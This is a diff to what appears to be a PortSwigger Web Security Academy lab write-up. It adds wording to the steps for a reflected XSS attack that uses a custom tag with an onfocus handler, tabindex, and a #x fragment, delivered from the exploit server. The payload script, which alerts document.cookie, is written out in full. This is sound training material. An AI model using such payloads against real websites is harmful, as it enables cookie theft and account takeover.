@@ -7,7 +7,8 @@
 - tabindex=1 → to make the element focusable.
 - #x → to automatically give focus to the element with id="x" on page load.
 - Go to the exploit server.
-- Enter this Final Payload in the Body:
+- Enter this Final URL encoded Payload in the Body:
   `<script>
     location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1%3E#x';
   </script>`
+- Write your actual lab id in place of `YOUR-LAB-ID` and click `Deliver exploit to victim`.
